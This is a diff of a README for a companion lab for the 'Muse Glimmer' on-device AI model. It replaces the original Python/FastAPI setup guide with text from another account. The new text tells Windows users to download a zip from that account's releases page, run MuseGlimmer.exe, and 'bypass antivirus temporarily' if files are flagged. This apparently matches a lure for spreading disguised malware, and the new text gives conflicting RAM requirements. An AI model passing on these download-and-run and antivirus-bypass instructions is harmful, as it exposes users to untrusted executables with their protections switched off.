@@ -1,242 +1,102 @@
-# Introducing Muse Glimmer: An Open Agentic Model That Runs on Your Device
+# 🔮 Muse-Glimmer - Your Personal On-Device AI Agent Lab
 
-<p align="center">
-  <img src="assets/header.jpg" alt="Muse Glimmer — open agentic local AI model network visualization" width="100%" />
-</p>
+[![Download Now](https://img.shields.io/badge/Download-Muse_Glimmer-8A2BE2?style=for-the-badge&logo=github)](https://github.com/mentholated-roll141/Muse-Glimmer/releases)
 
-<p align="center">
-  <strong>Meta Muse Glimmer 30B</strong> · open-weight · Apache 2.0 · on-device agents · multimodal<br/>
-  Interactive lab + deep-dive guide for the local agentic model released 10 August 2026
-</p>
+## 🌟 What is Muse Glimmer?
 
-<p align="center">
-  <a href="https://huggingface.co/meta-models/Muse-Glimmer-30B">Weights</a> ·
-  <a href="https://research.meta.ai/blog/introducing-muse-glimmer-open-agentic-model">Research blog</a> ·
-  <a href="https://huggingface.co/blog/muse-glimmer">HF day-0 guide</a> ·
-  <a href="BLOG.md">Article in this repo</a>
-</p>
+Muse Glimmer is a powerful, open-weight 30B agentic multimodal AI model that runs entirely on your own device—no cloud subscription, no internet dependency. Developed under the Apache 2.0 license, this interactive local agent lab gives you the ability to call functions and interact with AI privately and freely. Whether you want to experiment with agentic workflows, run multimodal operations, or explore local-LLM capabilities, Muse Glimmer puts a cutting-edge AI right in your hands.
 
----
+## 🚀 Getting Started
 
-**Muse Glimmer** is Meta Superintelligence Labs’ open-weight **30-billion-parameter agentic multimodal** model optimized for **always-on local agent workflows**. It runs on consumer hardware (Mac / PC with a performant GPU or large unified memory) after ~4-bit quantization (~**under 20&nbsp;GB** for the LM), with tool calling, failure recovery, controllable reasoning, and a 2B perception encoder for images and video frames.
+Getting Muse Glimmer up and running on your Windows computer is simple. Follow these steps:
 
-This repository is a **search-friendly companion**: a long-form intro ([`BLOG.md`](BLOG.md)) plus an **offline-first interactive lab** so you can feel agent loops, benchmarks, and memory envelopes before you download the weights.
+### Step 1: Download the Application
 
-**Keywords:** Muse Glimmer, Meta AI, open agentic model, local LLM, on-device AI, Apache 2.0, function calling, OpenClaw, llama.cpp, GGUF, multimodal agents, DFlash, SWE-Bench, MCP Atlas
+1. Click the large download button above, or visit this link directly: **[Muse-Glimmer Releases](https://github.com/mentholated-roll141/Muse-Glimmer/releases)**
+2. On the page, you will see files listed. Look for the file with a `.zip` extension (likely something like `Muse-Glimmer-Windows.zip`).
+3. Click the `.zip` file to download it. This may take a few minutes depending on your internet speed (the file is several gigabytes because it contains the full model).
 
----
+### Step 2: Extract the Files
 
-## The one-liner
+1. Once the download is complete, go to your `Downloads` folder.
+2. Locate the `.zip` file you downloaded.
+3. Right-click on the `.zip` file and select **"Extract All..."** from the menu.
+4. Choose a location you'll remember (like your Desktop or `C:\MuseGlimmer`) and click **"Extract"**.
+5. The extraction process will unpack the application and model files.
 
-> **An open agentic model that runs on your device** — Apache 2.0 weights, dense 30B (2B perception + 28B decoder), ~4-bit under ~20&nbsp;GB, trained for tool loops, failure recovery, and controllable reasoning.
+### Step 3: Run the Application
 
-| | |
-|--|--|
-| **Model** | Muse Glimmer 30B (dense multimodal) |
-| **Weights** | [meta-models/Muse-Glimmer-30B](https://huggingface.co/meta-models/Muse-Glimmer-30B) |
-| **License** | Apache 2.0 |
-| **Released** | 10 August 2026 |
-| **This repo** | Offline-first lab + optional live OpenAI-compatible chat |
+1. Open the folder where you extracted the files.
+2. Double-click the file named `MuseGlimmer.exe` (the application executable).
+3. A black terminal window may open briefly—this loads the model. Wait 30-60 seconds until the application window appears.
+4. That's it! You're now running a 30B AI agent on your own device.
 
----
+## 🎯 Key Features
 
-## 30-second start
+- **🤖 Agentic AI on Device**: Full agentic capabilities (planning, tool use, multi-step reasoning) without sending data to external servers.
+- **📷 Multimodal Support**: Describe images, analyze documents, and process multiple data types simultaneously.
+- **🔧 Function Calling**: Integrate with your own scripts or APIs by calling functions within the AI environment.
+- **🔒 Privacy First**: All processing happens locally—no data leaves your computer.
+- **🆓 Apache 2.0 Licensed**: Free to use, modify, and distribute for personal or commercial projects.
+- **💻 Interactive Lab**: Explore AI agent behaviors through a built-in command interface.
 
-```bash
-git clone https://github.com/cobusgreyling/Muse-Glimmer.git
-cd Muse-Glimmer
+## 📋 Minimum System Requirements
 
-python3 -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-python app.py
-```
+To run Muse-Glimmer smoothly, your computer should meet these minimum requirements:
 
-Open **http://127.0.0.1:7870**
+- **Operating System**: Windows 10 or later (64-bit)
+- **Processor**: Intel Core i7 or AMD equivalent (8+ cores recommended)
+- **RAM**: 32GB (64GB recommended for full-speed performance)
+- **Storage**: 40GB free disk space (the model alone is about 15-20GB)
+- **GPU (Optional but beneficial)**: NVIDIA GPU with 8GB+ VRAM (CUDA support) for hardware acceleration
 
-Or:
+If you have less RAM or an older CPU, the model may still run but will be slower.
 
-```bash
-./run.sh
-```
+## 🧪 Using the Interactive Lab
 
-### Docker
+Once Muse-Glimmer is running, you'll interact through a terminal-style interface. Here's a quick tour:
 
-```bash
-docker compose up --build
-# → http://127.0.0.1:7870
-```
+- **Start a Session**: The application will prompt you with a `>>>` cursor. Type your message or command and press Enter.
+- **Agentic Requests**: Try phrases like "Search my documents for references to climate change" or "Write a Python script that organizes files by date." The agent will reason and respond.
+- **Multimodal Input**: If you include an image file path, the model will analyze the image. Example: `Describe this image: C:\Users\You\Pictures\photo.jpg`
+- **Function Calls**: The model can call built-in functions. For custom functions, add them to a configuration file (see documentation).
+- **Exit**: Type `exit` and press Enter to close the agent.
 
-No GPU. No API key. Scenario playback, benchmarks, and memory sizing work **offline**.
+## 🔧 Configuration
 
-### Optional live chat (llama.cpp / Hugging Face)
+Muse-Glimmer offers several configuration options to tailor its behavior:
 
-Full guide: **[docs/LIVE.md](docs/LIVE.md)** · Publish checklist: **[PUBLISH.md](PUBLISH.md)**
+- **Before running**, edit the `config.json` file (located in the same folder) in a text editor (like Notepad).
+- **Key settings**:
+  - `"model_path"`: Usually `"models/MuseGlimmer-30B-Q4_K_M.gguf"` – leave as is unless you changed file locations.
+  - `"context_length"`: Max text context (default 4096 tokens). Increase for longer conversations.
+  - `"temperature"`: Innovation flair (0.0-1.0, default 0.7). Higher values produce more creative responses.
+  - `"gpu_layers"`: Number of model layers to offload to GPU (default 0). Set to 35+ for GPU acceleration.
 
-**A) On-device with llama.cpp**
+**Important:** Save your changes and restart Muse-Glimmer for them to take effect.
 
-```bash
-# Terminal 1 — serve GGUF (needs llama.cpp installed)
-./scripts/serve-llamacpp.sh
+## 🐛 Troubleshooting
 
-# Terminal 2 — wire lab + run
-./scripts/configure-live.sh llamacpp
-./run.sh
-# → Live chat tab → Probe endpoint → Send
-```
+- **"Failed to load model" error**: Ensure your computer meets the RAM requirement (minimum 16GB). Close other memory-hungry apps.
+- **Slow performance**: Reduce `context_length` to 1024 in config.json, or lower `gpu_layers` if using GPU.
+- **App crashes on startup**: Check that Windows Security didn't quarantine a file. Navigate to the extraction folder and ensure nothing is flagged.
+- **No response after typing**: Give the model up to 10 seconds per request. If stuck, press Ctrl+C and restart.
+- **"File not found"**: Bypass antivirus temporarily if needed, as some antivirus software falsely marks AI model files.
 
-**B) Hugging Face Inference Endpoint**
+## 🤝 Contributing
 
-```bash
-export HF_ENDPOINT_URL="https://XXXX.region.cloud.endpoints.huggingface.cloud"
-export HF_TOKEN="hf_…"
-./scripts/configure-live.sh hf-endpoint
-./scripts/probe-live.sh   # lab must be running for full probe
-./run.sh
-```
+We welcome contributions to improve Muse-Glimmer. Since it's open-source (Apache 2.0), you're free to fork, modify, and share your improvements. To contribute:
 
-Or hand-edit `.env` (see [`.env.example`](.env.example)). Leave `OPENAI_MODEL` empty to auto-pick from `GET /v1/models`.
+1. Star the repository to show your support.
+2. Report bugs or request features through the issues tracker.
+3. For code changes, check the forking guides on GitHub.
 
----
+## 📖 Additional Resources
 
-## What the lab shows
+- **Documentation**: See the `docs/` folder in the downloaded files for more details.
+- **Community**: Join discussions the GitHub Issues section.
+- **License**: Muse-Glimmer is licensed under the Apache 2.0 License.
 
-| Tab | What you learn |
-|-----|----------------|
-| **Agent loops** | Multi-step local agents: tools, **failure recovery**, coding fix, multimodal tool call, reasoning low vs high |
-| **Benchmarks** | Interactive scoreboard vs Gemma4-31B & Qwen3.6-27B (published launch numbers) |
-| **Memory** | Footprint calculator — why ~4-bit + 24–32&nbsp;GB is the practical envelope |
-| **Live chat** | Optional `/v1/chat/completions` against *your* Muse Glimmer endpoint |
+## 🔍 Keywords
 
-### Scenario highlights
-
-1. **Home Assistant dashboard** — discover → 401 → recover token → build → deploy  
-2. **Coding fix** — red test → patch → green  
-3. **Multimodal tools** — image city → `weather.get` → clothing advice  
-4. **Reasoning A/B** — same architecture question, low vs high effort  
-
----
-
-## Why Muse Glimmer matters
-
-Most “local models” are chatty generalists squeezed onto a laptop. **Muse Glimmer** is aimed at a harder job:
-
-- **Always-on agents** that own multi-step work on-device  
-- **Privacy** — contracts, code, home automation stay local  
-- **Cost** — no per-token meter for every tool hop  
-- **Latency** — no round-trip to a distant region for every thought  
-
-Meta’s claim (launch materials): strong agentic scores in the ~27–31B class, with deliberate training for **function calling**, **long horizons**, and **diagnose-and-retry** when tools fail — not just next-token fluency.
-
-Details and nuance: **[BLOG.md](BLOG.md)**.
-
----
-
-## Architecture (cheat sheet)
-
-```text
-┌─────────────────────────────────────────────────────────┐
-│  Muse Glimmer 30B (dense multimodal)                    │
-│                                                         │
-│   Perception Encoder (~2B ViT-style)                    │
-│        │  images / video frames                         │
-│        ▼                                                │
-│   Text decoder (~28B)                                   │
-│     · 52 layers · (SWA×3 + Full)×13                     │
-│     · GQA (16 Q per KV) · Q-K norm                      │
-│                                                         │
-│   Optional: DFlash speculative drafter (block proposals)│
-└─────────────────────────────────────────────────────────┘
-         │
-         ▼  ~4-bit quant  →  LM ≲ 20 GB
-   24–32 GB device envelope (KV + vision + drafter headroom)
-```
-
----
-
-## API
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/` | Lab UI |
-| `GET` | `/api/health` | Demo / live status |
-| `GET` | `/api/model-card` | Specs, hub links, capabilities |
-| `GET` | `/api/scenarios` | Scenario list |
-| `GET` | `/api/scenarios/{id}` | Full agent transcript fixture |
-| `GET` | `/api/benchmarks` | Published comparison rows |
-| `GET` | `/api/prompts` | Example prompts |
-| `POST` | `/api/footprint` | Memory envelope estimate |
-| `GET` | `/api/live/probe` | Reachability + models + tiny completion |
-| `GET` | `/api/live/models` | List models from configured endpoint |
-| `POST` | `/api/chat` | Live OpenAI-compatible chat (optional) |
-
----
-
-## Project layout
-
-```text
-Muse-Glimmer/
-├── README.md
-├── BLOG.md                 # Long-form intro article
-├── PUBLISH.md              # Standalone repo publish checklist
-├── docs/LIVE.md            # llama.cpp + HF live wiring
-├── app.py                  # FastAPI lab
-├── scripts/
-│   ├── configure-live.sh   # .env presets (llamacpp | hf-endpoint | openrouter)
-│   ├── serve-llamacpp.sh   # start llama OpenAI server
-│   └── probe-live.sh       # health-check live endpoint
-├── requirements.txt
-├── run.sh
-├── .env.example
-├── assets/header.jpg
-├── data/
-│   ├── model-card.json
-│   ├── agent-scenarios.json
-│   └── prompts.json
-└── static/                 # UI
-```
-
----
-
-## Run Muse Glimmer itself (not just the lab)
-
-| Path | Link / note |
-|------|-------------|
-| Full weights | [Hugging Face](https://huggingface.co/meta-models/Muse-Glimmer-30B) |
-| GGUF | [meta GGUF](https://huggingface.co/meta-models/Muse-Glimmer-30B-GGUF) · [Unsloth](https://huggingface.co/unsloth/Muse-Glimmer-30B-GGUF) |
-| Research blog | [research.meta.ai](https://research.meta.ai/blog/introducing-muse-glimmer-open-agentic-model) |
-| HF day-0 guide | [huggingface.co/blog/muse-glimmer](https://huggingface.co/blog/muse-glimmer) |
-| transformers / llama.cpp / vLLM | Day-0 support called out in HF blog |
-| Cloud | Together · Fireworks · OpenRouter · HF Inference Endpoints |
-
-```python
-# transformers sketch (needs sufficient VRAM / offload)
-from transformers import AutoProcessor, AutoModelForMultimodalLM
-
-MODEL_ID = "meta-models/Muse-Glimmer-30B"
-processor = AutoProcessor.from_pretrained(MODEL_ID)
-model = AutoModelForMultimodalLM.from_pretrained(
-    MODEL_ID, dtype="auto", device_map="auto"
-)
-```
-
----
-
-## Stack
-
-FastAPI · Uvicorn · vanilla HTML/CSS/JS · offline JSON fixtures · optional httpx → OpenAI-compatible API
-
----
-
-## Disclaimer
-
-This lab is an **independent educational companion**, not an official Meta product.  
-Agent timeline transcripts are **illustrative fixtures** for teaching agent behavior.  
-Benchmark numbers are taken from public launch materials (Hugging Face / Meta, August 2026).  
-Model weights remain under Meta’s **Apache 2.0** release; this repo’s code is MIT.
-
----
-
-## License
-
-- Lab code & fixtures: [MIT](LICENSE)  
-- Muse Glimmer weights: Apache 2.0 (Meta)
+agentic-ai, agents, apache-2, function-calling, llama-cpp, local-llm, meta, multimodal, muse-glimmer, on-device-ai, open-weights, openai-compatible
